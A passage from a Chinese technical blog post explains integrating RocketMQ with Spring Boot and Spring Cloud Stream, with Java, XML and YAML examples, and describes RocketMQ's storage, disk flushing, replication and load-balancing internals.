<li>添加**@RocketMQMessageListener**注解，并且指定订阅的Topic和消费组等属性。</li>
<li>实现<strong>RocketMQListener</strong>接口，泛型就是消息的类型，接着实现其中的<strong>onMessage</strong>监听方法。代码中我们使用的MessageExt是Message的子类，对其进行了扩展。</li>
</ol>
<p>关于事务消息的具体案例可以参考<a class="link"   href="https://jimmyz.top/2020/09/25/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/" >分布式事务解决方案<i class="fas fa-external-link-alt"></i></a>一文 。</p>
<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>SpringBoot RocketMQ还提供了扩展功能，它允许我们对<strong>RocketMQTemplate</strong>进行扩展：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ExtRocketMQTemplateConfiguration()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExtRocketMQTemplate</span> <span class="keyword">extends</span> <span class="title class_">RocketMQTemplate</span> &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在注解<code>@ExtRocketMQTemplateConfiguration</code>中可以定制非常多的属性：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> ExtRocketMQTemplateConfiguration &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The component name of the Producer configuration.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    String <span class="title function_">value</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The property of &quot;name-server&quot;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    String <span class="title function_">nameServer</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;$&#123;rocketmq.name-server:&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Name of producer.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    String <span class="title function_">group</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;$&#123;rocketmq.producer.group:&#125;&quot;</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Millis of send message timeout.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">sendMessageTimeout</span><span class="params">()</span> <span class="keyword">default</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Compress message body threshold, namely, message body larger than 4k will be compressed on default.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">compressMessageBodyThreshold</span><span class="params">()</span> <span class="keyword">default</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Maximum number of retry to perform internally before claiming sending failure in synchronous mode.</span></span><br><span class="line"><span class="comment">     * This may potentially cause message duplication which is up to application developers to resolve.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">retryTimesWhenSendFailed</span><span class="params">()</span> <span class="keyword">default</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * &lt;p&gt; Maximum number of retry to perform internally before claiming sending failure in asynchronous mode. &lt;/p&gt;</span></span><br><span class="line"><span class="comment">     * This may potentially cause message duplication which is up to application developers to resolve.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">retryTimesWhenSendAsyncFailed</span><span class="params">()</span> <span class="keyword">default</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Indicate whether to retry another broker on sending failure internally.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">retryNextServer</span><span class="params">()</span> <span class="keyword">default</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Maximum allowed message size in bytes.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">maxMessageSize</span><span class="params">()</span> <span class="keyword">default</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The property of &quot;access-key&quot;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    String <span class="title function_">accessKey</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;$&#123;rocketmq.producer.accessKey:&#125;&quot;</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The property of &quot;secret-key&quot;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    String <span class="title function_">secretKey</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;$&#123;rocketmq.producer.secretKey:&#125;&quot;</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Switch flag instance for message trace.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">enableMsgTrace</span><span class="params">()</span> <span class="keyword">default</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The name value of message trace topic.If you don&#x27;t config,you can use the default trace topic name.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    String <span class="title function_">customizedTraceTopic</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;$&#123;rocketmq.producer.customized-trace-topic:&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h1 id="SpringCloudStream整合RocketMQ"><a href="#SpringCloudStream整合RocketMQ" class="headerlink" title="SpringCloudStream整合RocketMQ"></a>SpringCloudStream整合RocketMQ</h1><p>SpringCloudStream是Spring社区提供的一个统一的消息驱动框架，目的是想要以一个统一的编程模型来对接所有的MQ消息中间件产品。SpringCloudStream将MQ高度抽象，分为如下两个部分：</p>
<ul>
<li>Binder：具体的MQ产品。</li>
<li>Bindings：应用与MQ产品直接的消息通道。</li>
</ul>
<p>看上去确实很抽象，我们通过具体例子来看看SpringCloudStream如何集成RocketMQ。</p>
<h2 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.3.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--SpringCloudStream的RocketMQ依赖，由于版本原因，需要排除其中的RocketMQ客户端和ACL--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-stream-rocketmq<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.3.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.rocketmq<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rocketmq-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.rocketmq<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rocketmq-acl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--RocketMQ客户端--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.rocketmq<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rocketmq-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--ACL--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.rocketmq<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rocketmq-acl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="启动类"><a href="#启动类" class="headerlink" title="启动类"></a>启动类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 添加特有的@EnableBinding注解</span></span><br><span class="line"><span class="meta">@EnableBinding(&#123;Source.class, Sink.class&#125;)</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScRocketMQApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(ScRocketMQApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SpringCloudStream通用的配置以spring.cloud.stream开头</span></span><br><span class="line"><span class="comment"># 消息消费者，input对应Sink接口</span></span><br><span class="line"><span class="string">spring.cloud.stream.bindings.input.destination=TestTopic</span></span><br><span class="line"><span class="string">spring.cloud.stream.bindings.input.group=scGroup</span></span><br><span class="line"><span class="comment"># 消息发送者，output对应Source接口</span></span><br><span class="line"><span class="string">spring.cloud.stream.bindings.output.destination=TestTopic</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RocketMQ的个性化配置以spring.cloud.stream.rocketmq开头</span></span><br><span class="line"><span class="string">spring.cloud.stream.rocketmq.binder.name-server=192.168.74.88:9876;192.168.74.77:9876;</span></span><br></pre></td></tr></table></figure>

<h2 id="生产者与消费者"><a href="#生产者与消费者" class="headerlink" title="生产者与消费者"></a>生产者与消费者</h2><ul>
<li>生产者</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScProducer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注入Source</span></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> Source source;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendMessage</span><span class="params">(String msg)</span>&#123;</span><br><span class="line">        <span class="comment">// 构建消息</span></span><br><span class="line">        Message&lt;String&gt; message = MessageBuilder</span><br><span class="line">                .withPayload(msg)</span><br><span class="line">                .setHeader(MessageConst.PROPERTY_TAGS,<span class="string">&quot;tag&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line">        <span class="comment">// 通过如下方式发送消息</span></span><br><span class="line">        <span class="built_in">this</span>.source.output().send(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>消费者</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScConsumer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过@StreamListener注解标记消费者</span></span><br><span class="line">    <span class="meta">@StreamListener(Sink.INPUT)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String messsage)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;received message:&quot;</span> + messsage + <span class="string">&quot; from binding:&quot;</span> +</span><br><span class="line">                Sink.INPUT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>可以看到，使用起来非常非常简单，SpringCloudStream的特点如下：</p>
<ul>
<li>这是一套几乎通用的消息中间件编程框架，例如从对接RocketMQ换到对接Kafka，业务代码几乎不需要动，只需要更换pom依赖并且修改配置文件就行了。但是，由于各个MQ产品都有自己的业务模型，差距非常大，所以使用使用SpringCloudStream时要注意业务模型转换。并且在实际使用中，要非常注意各个MQ的个性化配置属性。例如RocketMQ的个性化属性都是以<code>spring.cloud.stream.rocketmq</code>开头，只有通过这些属性才能用上RocketMQ的延迟消息、排序消息、事务消息等个性化功能。</li>
<li>SpringCloudStream是Spring社区提供的一套统一框架，但是官方目前只封装了kafka、kafka Stream、RabbitMQ的具体依赖。而RocketMQ的依赖是交由厂商自己维护的，也就是由阿里巴巴自己来维护。这个维护力度显然是有不小差距的。<code>spring-cloud-starter-stream-rocketmq</code>目前最新的2.2.3.RELEASE版本中包含的<code>rocketmq-client</code>版本还是4.4.0。另一方面，SpringCloudStream中关于RocketMQ的个性化配置几乎很难找到完整的文档。</li>
<li>总之，对于RocketMQ来说，SpringCloudStream目前来说还并不是一个非常好的集成方案。这方面跟kafka和Rabbit还没法比。所以使用时要慎重。</li>
</ul>
<h1 id="RocketMQ进阶"><a href="#RocketMQ进阶" class="headerlink" title="RocketMQ进阶"></a>RocketMQ进阶</h1><h2 id="消息存储"><a href="#消息存储" class="headerlink" title="消息存储"></a>消息存储</h2><p>分布式队列因为有高可靠性的要求，所以数据要进行持久化存储，如下图所示：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2020/10/02/ywPfpQavhC4uYRt.png"
                      alt="rocket9.png"
                ></p>
<ol>
<li>消息生成者发送消息</li>
<li>MQ收到消息，将消息进行持久化，在存储中新增一条记录</li>
<li>返回ACK给生产者</li>
<li>MQ push 消息给对应的消费者，然后等待消费者返回ACK</li>
<li>如果消息消费者在指定时间内成功返回ack，那么MQ认为消息消费成功，在存储中删除消息，即执行第6步；如果MQ在指定时间内没有收到ACK，则认为消息消费失败，会尝试重新push消息，重复执行4、5、6步骤</li>
<li>MQ删除消息</li>
</ol>
<h3 id="存储介质"><a href="#存储介质" class="headerlink" title="存储介质"></a>存储介质</h3><ul>
<li>关系型数据库DB</li>
</ul>
<p>Apache下开源的另外一款MQ—ActiveMQ（默认采用的KahaDB做消息存储）可选用JDBC的方式来做消息持久化，通过简单的xml配置信息即可实现JDBC消息存储。由于，普通关系型数据库（如Mysql）在单表数据量达到千万级别的情况下，其IO读写性能往往会出现瓶颈。在可靠性方面，该种方案非常依赖DB，如果一旦DB出现故障，则MQ的消息就无法落盘存储会导致线上故障。</p>
<ul>
<li>文件系统</li>
</ul>
<p>目前业界较为常用的几款产品（RocketMQ&#x2F;Kafka&#x2F;RabbitMQ）均采用的是消息刷盘至所部署虚拟机&#x2F;物理机的文件系统来做持久化（刷盘一般可以分为异步刷盘和同步刷盘两种模式）。消息刷盘为消息存储提供了一种高效率、高可靠性和高性能的数据持久化方式。除非部署MQ机器本身或是本地磁盘挂了，否则一般是不会出现无法持久化的故障问题。</p>
<ul>
<li>性能对比</li>
</ul>
<p>文件系统 &gt; 关系型数据库DB</p>
<h3 id="消息的存储和发送"><a href="#消息的存储和发送" class="headerlink" title="消息的存储和发送"></a>消息的存储和发送</h3><ul>
<li>消息存储</li>
</ul>
<p>磁盘如果使用得当，磁盘的速度完全可以匹配上网络的数据传输速度。目前的高性能磁盘，<strong>顺序写</strong>速度可以达到600MB&#x2F;s， 超过了一般网卡的传输速度。但是磁盘随机写的速度只有大概100KB&#x2F;s，和顺序写的性能相差6000倍！因为有如此巨大的速度差别，好的消息队列系统会比普通的消息队列系统速度快多个数量级。RocketMQ的消息用顺序写，保证了消息存储的速度。</p>
<ul>
<li>消息发送</li>
</ul>
<p>Linux操作系统分为【用户态】和【内核态】，文件操作、网络操作需要涉及这两种形态的切换，免不了进行数据复制。一台服务器把本机磁盘文件的内容发送到客户端，一般分为两个步骤：</p>
<ol>
<li>read：读取本地文件内容。</li>
<li>write：将读取的内容通过网络发送出去。</li>
</ol>
<p>这两个看似简单的操作，实际进行了4次数据复制，分别是：</p>
<ol>
<li>从磁盘复制数据到内核态内存。</li>
<li>从内核态内存复制到用户态内存。</li>
<li>然后从用户态内存复制到网络驱动的内核态内存。</li>
<li>最后是从网络驱动的内核态内存复制到网卡中进行传输。</li>
</ol>
<p><a href="https://i.loli.net/2020/10/02/zosLi24fNV7yPQZ.png"><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2020/10/02/zosLi24fNV7yPQZ.png"
                      alt="rocket10.png"
                ></a></p>
<p>通过使用mmap(内存映射)的方式，可以省去向用户态的内存复制，提高速度。这种机制在Java中是通过<strong>MappedByteBuffer</strong>实现的。RocketMQ充分利用了该特性，也就是所谓的<strong>零拷贝</strong>技术，提高消息存盘和网络发送的速度。</p>
<blockquote>
<p>这里需要注意的是，采用MappedByteBuffer这种内存映射的方式有几个限制，其中之一是一次只能映射1.5~2G 的文件至用户态的虚拟内存，这也是为何RocketMQ默认设置单个CommitLog日志数据文件为1G的原因了。</p>
<p>关于零拷贝，JAVA的NIO中提供了两种实现方式，mmap和sendfifile，其中mmap适合比较小的文件，而sendfifile适合传递比较大的文件。</p>
</blockquote>
<h3 id="消息存储结构"><a href="#消息存储结构" class="headerlink" title="消息存储结构"></a>消息存储结构</h3><p>RocketMQ消息的存储是由Consumer Queue和CommitLog配合完成的，消息真正的物理存储文件是CommitLog，Consumer Queue是消息的逻辑队列，类似数据库的索引文件，存储的是指向物理存储的地址，而不是具体的消息内容。每个Topic下的每个Message Queue都有一个对应的Consumer Queue文件。</p>
<p><a href="https://i.loli.net/2020/10/02/5cs4daB7qhbNSXg.png"><img  
                     lazyload
                     alt="image"
                     data-src="http://jimmyz.top/img/loading.gif"
                      alt="rocket11.png"
                ></a></p>
<ul>
<li>CommitLog：存储消息的元数据。生产者发送的所有消息都会顺序存入到CommitLog文件当中。CommitLog由多个文件组成，每个文件固定大小1G。以第一条消息的偏移量为文件名。</li>
<li>ConsumerQueue：存储消息在CommitLog的索引，而不存储消息具体内容。一个Message Queue对应一个文件，记录当前Message Queue被哪些消费者组消费到了哪一条CommitLog。</li>
<li>IndexFile：为了消息查询提供了一种通过key或时间区间来查询消息的方法，这种通过IndexFile来查找消息的方法不影响发送与消费消息的主流程。</li>
</ul>
<blockquote>
<p>还记得我们在搭建集群时都特意指定的文件存储路径吗？现在可以上去看看这些文件都是什么样子。还有哪些落盘的文件？另外还有几个文件可以了解下：</p>
<ul>
<li>abort：这个文件是RocketMQ用来判断程序是否正常关闭的一个标识文件。正常情况下，会在启动时创建，而关闭服务时删除。但是如果遇到一些服务器宕机，或者<code>kill</code>这样一些非正常关闭服务的情况，这个abort文件就不会删除，因此RocketMQ就可以判断上一次服务是非正常关闭的，后续就会做一些数据恢复的操作。</li>
<li>checkpoint：数据存盘检查点。</li>
<li>confifig&#x2F;*.json：这些文件是将RocketMQ的一些关键配置信息进行存盘保存。例如Topic配置、消费者组配置、消费者组消息偏移量Offffset 等等一些信息。</li>
</ul>
</blockquote>
<h3 id="刷盘机制"><a href="#刷盘机制" class="headerlink" title="刷盘机制"></a>刷盘机制</h3><p>RocketMQ的消息是存储到磁盘上的，这样既能保证断电后恢复， 又可以让存储的消息量超出内存的限制。RocketMQ为了提高性能，会尽可能地保证磁盘的顺序写。消息在通过Producer写入RocketMQ的时候，有两种写磁盘方式，<strong>同步刷</strong>盘和<strong>异步刷盘</strong>。</p>
<p><a href="https://i.loli.net/2020/10/02/iyLSHB6z1jPUtoV.png"><img  
                     lazyload
                     alt="image"
                     data-src="http://jimmyz.top/img/loading.gif"
                      alt="rocket12.png"
                ></a></p>
<ul>
<li>同步刷盘</li>
</ul>
<p>在返回写成功状态时，消息已经被写入磁盘。具体流程是，消息写入内存的后，立刻通知刷盘线程刷盘， 然后等待刷盘完成，刷盘线程执行完成后唤醒等待的线程，返回消息写成功的状态。</p>
<ul>
<li>异步刷盘</li>
</ul>
<p>在返回写成功状态时，消息可能只是被写入了内存，写操作的返回快，吞吐量大；当内存里的消息量积累到一定程度时，统一触发写磁盘动作，快速写入。</p>
<ul>
<li>配置</li>
</ul>
<p><strong>同步刷盘还是异步刷盘，都是通过Broker配置文件里的flushDiskType 参数设置的，这个参数被配置成SYNC_FLUSH、ASYNC_FLUSH中的 一个。</strong></p>
<h2 id="高可用性机制"><a href="#高可用性机制" class="headerlink" title="高可用性机制"></a>高可用性机制</h2><p><a href="https://i.loli.net/2020/10/01/ClKAntIVBEWQ9z1.jpg"><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2020/10/01/ClKAntIVBEWQ9z1.jpg"
                      alt="rocket1.jpg"
                ></a></p>
<p>RocketMQ分布式集群是通过Master和Slave的配合达到高可用性的。</p>
<p>Master和Slave的区别：在Broker的配置文件中，参数 brokerId的值为0表明这个Broker是Master，大于0表明这个Broker是 Slave，同时brokerRole参数也会说明这个Broker是Master还是Slave。</p>
<p>Master角色的Broker支持读和写，Slave角色的Broker仅支持读，也就是 Producer只能和Master角色的Broker连接写入消息；Consumer可以连接 Master角色的Broker，也可以连接Slave角色的Broker来读取消息。</p>
<h3 id="消息消费高可用"><a href="#消息消费高可用" class="headerlink" title="消息消费高可用"></a>消息消费高可用</h3><p>RocketMQ从如下两个方面可以保证消费高可用：</p>
<ul>
<li>RocketMQ中，消费者同样会把同一类Consumer组成一个集合，叫做消费者组，这类Consumer通常消费同一类消息且消费逻辑一致。消费者组使得在消息消费方面，实现负载均衡和容错的目标变得非常容易。要注意的是，消费者组的消费者实例必须订阅完全相同的Topic。</li>
<li>另外在RocketMQ集群中，Consumer的配置文件里并不需要设置是从Master读还是从Slave 读，当Master不可用或者繁忙的时候，Consumer会被自动切换到从Slave读。有了自动切换Consumer这种机制，当一个Master角色的机器出现故障后，Consumer仍然可以从Slave读取消息，不影响Consumer程序。</li>
</ul>
<h3 id="消息发送高可用"><a href="#消息发送高可用" class="headerlink" title="消息发送高可用"></a>消息发送高可用</h3><p>RocketMQ从如下两个方面可以保证发送高可用：</p>
<ul>
<li>和消费者一样，RocketMQ中会把同一类Producer组成一个集合，叫做生产者组，这类Producer发送同一类消息且发送逻辑一致。如果发送的是事务消息且原始生产者在发送之后崩溃，则Broker服务器会联系同一生产者组的其他生产者实例以提交或回溯消费。</li>
<li>在创建Topic的时候，把Topic的多个Message Queue创建在多个Broker组上（相同Broker名称，不同 brokerId的机器组成一个Broker组），这样当一个Broker组的Master不可用后，其他组的Master仍然可用，Producer仍然可以发送消息。 (Topic默认每个Master上4个队列)</li>
</ul>
<p><a href="https://i.loli.net/2020/10/02/dY6uevcfoh8Qtms.jpg"><img  
                     lazyload
                     alt="image"
                     data-src="http://jimmyz.top/img/loading.gif"
                      alt="rocket13.jpg"
                ></a></p>
<h3 id="消息主从复制"><a href="#消息主从复制" class="headerlink" title="消息主从复制"></a>消息主从复制</h3><p>如果一个Broker组有Master和Slave，消息需要从Master复制到Slave 上，有同步和异步两种复制方式。</p>
<ul>
<li>同步复制</li>
</ul>
<p>同步复制方式是等Master和Slave均写 成功后才反馈给客户端写成功状态；</p>
<p>在同步复制方式下，如果Master出故障， Slave上有全部的备份数据，容易恢复，但是同步复制会增大数据写入 延迟，降低系统吞吐量。</p>
<ul>
<li>异步复制</li>
</ul>
<p>异步复制方式是只要Master写成功 即可反馈给客户端写成功状态。</p>
<p>在异步复制方式下，系统拥有较低的延迟和较高的吞吐量，但是如果Master出了故障，有些数据因为没有被写 入Slave，有可能会丢失；</p>
<ul>
<li>配置</li>
</ul>
<p>同步复制和异步复制是通过Broker配置文件里的brokerRole参数进行设置的，这个参数可以被设置成ASYNC_MASTER、 SYNC_MASTER、SLAVE三个值中的一个。</p>
<ul>
<li>总结</li>
</ul>
<p><a href="https://i.loli.net/2020/10/02/4v8UfQCmnJzAr9E.png"><img  
                     lazyload
                     alt="image"
                     data-src="http://jimmyz.top/img/loading.gif"
                      alt="rocket14.png"
                ></a></p>
<p>实际应用中要结合业务场景，合理设置刷盘方式和主从复制方式， 尤其是SYNC_FLUSH方式，由于频繁地触发磁盘写动作，会明显降低性能。通常情况下，应该将刷盘方式配置成ASYNC_FLUSH，主从之间的复制方式配置成SYNC_MASTER，即采用<strong>异步刷盘、主从同步复制</strong>的方式。这样即使有一台机器出故障，仍然能保证数据不丢，是个不错的选择。</p>
<h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><h3 id="Producer负载均衡"><a href="#Producer负载均衡" class="headerlink" title="Producer负载均衡"></a>Producer负载均衡</h3><p>Producer端，每个实例在发消息的时候，默认会轮询所有的message queue发送，以达到让消息平均落在不同的queue上。而由于queue可以散落在不同的broker，所以消息就发送到不同的broker下，如下图：</p>
<p><a href="https://i.loli.net/2020/10/02/sC2ltujJIPxA1EB.png"><img  
                     lazyload
                     alt="image"
                     data-src="http://jimmyz.top/img/loading.gif"
                      alt="rocket15.png"
                ></a></p>
<p>图中箭头线条上的标号代表顺序，发布方会把第一条消息发送至 Queue 0，然后第二条消息发送至 Queue 1，以此类推。</p>
<h3 id="Consumer负载均衡"><a href="#Consumer负载均衡" class="headerlink" title="Consumer负载均衡"></a>Consumer负载均衡</h3><ul>
<li>集群模式</li>
</ul>
<p>在集群消费模式下，每条消息只需要投递到订阅这个topic的Consumer Group下的一个实例即可。RocketMQ采用主动拉取的方式拉取并消费消息，在拉取的时候需要明确指定拉取哪一条message queue。</p>
<p>而每当实例的数量有变更，都会触发一次所有实例的负载均衡，这时候会按照queue的数量和实例的数量平均分配queue给每个实例。默认的分配算法是<strong>AllocateMessageQueueAveragely</strong>，如下图：</p>
<p><a href="https://i.loli.net/2020/10/02/CHZFil2pyYPgDzW.png"><img  
                     lazyload
                     alt="image"
                     data-src="http://jimmyz.top/img/loading.gif"
                      alt="rocket16.png"
                ></a></p>
<p>还有另外一种平均的算法是<strong>AllocateMessageQueueAveragelyByCircle</strong>，也是平均分摊每一条queue，只是以环状轮流分queue的形式，如下图：</p>
<p><a href="https://i.loli.net/2020/10/02/CrUpBImqEtP865h.png"><img  
                     lazyload
                     alt="image"
                     data-src="http://jimmyz.top/img/loading.gif"
                      alt="rocket17.png"
                ></a></p>
<blockquote>
<p>另外还有两种比较独特的分配方式：</p>
<ul>
<li>AllocateMachineRoomNearby： 将同机房的Consumer和Broker优先分配在一起。这个策略可以通过一个machineRoomResolver对象来定制Consumer和Broker的机房解析规则。然后还需要引入另外一个分配策略来对同机房的Broker和Consumer进行分配。一般也就用简单的平均分配策略或者轮询分配策略。</li>
<li>AllocateMessageQueueByMachineRoom：按逻辑机房的概念进行分配。又是对BrokerName和ConsumerIdc有定制化的配置。</li>
</ul>
</blockquote>
<p>需要注意的是，集群模式下对于同一个消费者组来说，queue都是只允许分配一个实例，这是由于如果多个实例同时消费一个queue的消息，由于拉取哪些消息是consumer主动控制的，那样会导致同一个消息在不同的实例下被消费多次，所以算法上都是一个queue只分给一个consumer实例，一个consumer实例可以允许同时分到不同的queue。</p>
<p>通过增加consumer实例去分摊queue的消费，可以起到水平扩展的消费能力的作用。而有实例下线的时候，会重新触发负载均衡，这时候原来分配到的queue将分配到其他实例上继续消费。</p>
